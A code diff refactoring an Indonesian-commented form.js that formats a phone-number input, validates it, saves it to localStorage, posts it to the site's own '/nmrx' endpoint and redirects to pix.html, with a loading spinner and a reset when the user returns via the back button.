@@ -1,234 +1,136 @@
 // form.js
 
-const phoneInput =
-document.getElementById("phone");
+// ELEMENT SELECTORS
+const phoneInput = document.getElementById("phone");
+const lanjutBtn = document.getElementById("lanjutBtn");
+const errorBox = document.getElementById("errorBox");
+const clearBtn = document.getElementById("clearBtn");
 
-const lanjutBtn =
-document.getElementById("lanjutBtn");
-
-const loadingBox =
-document.getElementById("loadingBox");
-
-const clearBtn =
-document.getElementById("clearBtn");
-
-const errorBox =
-document.getElementById("errorBox");
-
-/* FADE IN */ 
+/* FADE IN INITIAL PAGE */ 
 window.addEventListener("load", () => {
-
-    document.body.classList.add(
-    "fade-in"
-    );
-
+    document.body.classList.add("fade-in");
 });
 
-/* AUTO FOCUS */
+/* AUTO FOCUS ON LOAD */
 window.onload = () => {
-
     phoneInput.focus();
-
 };
 
-/* FORMAT NOMOR */
-phoneInput.addEventListener(
-"input",
-(e) => {
+/* FORMAT NOMOR (INPUT MASKING: 812-3456-7890) */
+phoneInput.addEventListener("input", (e) => {
+    /* HANYA MENERIMA ANGKA */
+    let angka = e.target.value.replace(/\D/g, '');
 
-    /* ANGKA SAJA */
-    let angka =
-    e.target.value.replace(
-    /\D/g,
-    ''
-    );
-
-    /* MAX */
-    angka =
-    angka.substring(0,13);
+    /* MAKSIMAL 13 DIGIT ANGKA */
+    angka = angka.substring(0, 13);
 
     let hasil = "";
 
-    /* 812 */
-    if(angka.length > 0){
-
-        hasil +=
-        angka.substring(0,3);
-
+    /* SEGMEN 1 (3 Digit Pertama: e.g., 812) */
+    if (angka.length > 0) {
+        hasil += angka.substring(0, 3);
     }
 
-    /* 812-3456 */
-    if(angka.length >= 3){
-
-        hasil += "-" +
-        angka.substring(3,7);
-
+    /* SEGMEN 2 (4 Digit Kedua: e.g., 812-3456) */
+    if (angka.length >= 3) {
+        hasil += "-" + angka.substring(3, 7);
     }
 
-    /* 812-3456-7890 */
-    if(angka.length >= 7){
-
-        hasil += "-" +
-        angka.substring(7,13);
-
+    /* SEGMEN 3 (Sisa Digit: e.g., 812-3456-7890) */
+    if (angka.length >= 7) {
+        hasil += "-" + angka.substring(7, 13);
     }
 
     e.target.value = hasil;
 
-    /* SHOW / HIDE X */
-    if(hasil.length > 0){
-
-        clearBtn.style.display =
-        "flex";
-
-    }else{
-
-        clearBtn.style.display =
-        "none";
-
+    /* TAMPIL/SEMBUNYIKAN TOMBOL CLEAR (✕) */
+    if (hasil.length > 0) {
+        clearBtn.style.display = "flex";
+    } else {
+        clearBtn.style.display = "none";
     }
 
-    /* HIDE ERROR */
-    errorBox.classList.remove(
-    "show"
-    );
-
+    /* SEMBUNYIKAN ERROR SAAT USER MENGETIK KEMBALI */
+    errorBox.classList.remove("show");
 });
 
-/* CLEAR INPUT */
-clearBtn.addEventListener(
-"click",
-() => {
-
+/* TOMBOL HAPUS (CLEAR BUTTON) */
+clearBtn.addEventListener("click", () => {
     phoneInput.value = "";
-
-    clearBtn.style.display =
-    "none";
-
-    errorBox.classList.remove(
-    "show"
-    );
-
+    clearBtn.style.display = "none";
+    errorBox.classList.remove("show");
     phoneInput.focus();
-
 });
 
-/* KEYBOARD ANGKA */
-phoneInput.setAttribute(
-"inputmode",
-"numeric"
-);
+/* FORCE KEYBOARD ANGKA PADA PERANGKAT MOBILE */
+phoneInput.setAttribute("inputmode", "numeric");
 
-/* ENTER */
-phoneInput.addEventListener(
-"keypress",
-(e)=>{
-
-    if(e.key === "Enter"){
-
+/* SUBMIT SAAT TEKAN ENTER */
+phoneInput.addEventListener("keypress", (e) => {
+    if (e.key === "Enter") {
         lanjutBtn.click();
-
     }
-
 });
 
-/* LANJUT */
-lanjutBtn.addEventListener(
-"click",
- async () => {
+/* PROSES SUBMIT / LANJUT */
+lanjutBtn.addEventListener("click", async () => {
+    /* AMBIL HANYA ANGKA SAJA UNTUK VALIDASI */
+    const nomor = phoneInput.value.replace(/\D/g, '');
 
-    /* AMBIL NOMOR */
-    const nomor =
-    phoneInput.value.replace(
-    /\D/g,
-    ''
-    );
+    /* VALIDASI: MINIMAL 9 ANGKA DAN HARUS DIAWALI '8' */
+    if (nomor.length < 9 || nomor.charAt(0) !== "8") {
+        /* EFEK GETAR PADA HP (JIKA MENDUKUNG) */
+        if (navigator.vibrate) {
+            navigator.vibrate([120, 80, 120]);
+        }
 
-    /* VALIDASI */
-    if(
-        nomor.length < 9 ||
-        nomor.charAt(0) !== "8"
-    ){
+        /* TAMPILKAN EROR */
+        errorBox.classList.add("show");
 
-        if(navigator.vibrate){
-
-        navigator.vibrate([
-            120,
-            80,
-            120
-        ]);
-
-    }
-
-        /* SHOW ERROR */
-        errorBox.classList.add(
-        "show"
-        );
-
-        /* AUTO HIDE */
+        /* SEMBUNYIKAN EROR OTOMATIS SETELAH 2 DETIK */
         setTimeout(() => {
-
-            errorBox.classList.remove(
-            "show"
-            );
-
-        },2000);
+            errorBox.classList.remove("show");
+        }, 2000);
 
         phoneInput.focus();
-
         return;
-
     }
 
-    /* SIMPAN */
-    localStorage.setItem(
-    "nmrx",
-    phoneInput.value
-    );
+    // --- PROSES LOADING DI TOMBOL DIMULAI ---
+    lanjutBtn.classList.add("loading"); // Memunculkan spinner di dalam tombol via CSS
+    lanjutBtn.disabled = true;          // Kunci tombol agar tidak di-klik ganda (spam)
+    phoneInput.disabled = true;         // Kunci input field selama memproses data
 
-    /* KIRIM */
-    await fetch("/nmrx", {
+    /* SIMPAN DATA KE LOCAL STORAGE */
+    localStorage.setItem("nmrx", phoneInput.value);
 
-        method:"POST",
+    /* KIRIM DATA KE SERVER */
+    try {
+        await fetch("/nmrx", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                nmrx: phoneInput.value
+            })
+        });
+    } catch (error) {
+        console.error("Gagal mengirim data:", error);
+    }
 
-        headers:{
-            "Content-Type":
-            "application/json"
-        },
+    /* NAVIGASI / PINDAH HALAMAN SETELAH 2 DETIK */
+    setTimeout(() => {
+        /* EFEK FADE OUT HALAMAN */
+        document.body.classList.add("fade-out");
 
-        body:JSON.stringify({
-
-            nmrx:phoneInput.value
-
-        })
-
-    });
-
-    /* SHOW LOADING */
-    loadingBox.style.display =
-    "flex";
-
-    /* PINDAH */
-    setTimeout(()=>{
-
-      /* FADE OUT */
-    document.body.classList.add(
-    "fade-out"
-    );
-
-        window.location.href =
-        "pix.html";
-
-    },2000);
-
+        window.location.href = "pix.html";
+    }, 2000);
 });
 
-/* RESET LOADING */
-window.addEventListener(
-"pageshow",
-() => {
-
-    loadingBox.style.display =
-    "none";
-
+/* RESET KONDISI TOMBOL (JIKA USER KEMBALI DARI HALAMAN SEBELUMNYA VIA TOMBOL BACK BROWSER) */
+window.addEventListener("pageshow", () => {
+    lanjutBtn.classList.remove("loading");
+    lanjutBtn.disabled = false;
+    phoneInput.disabled = false;
 });
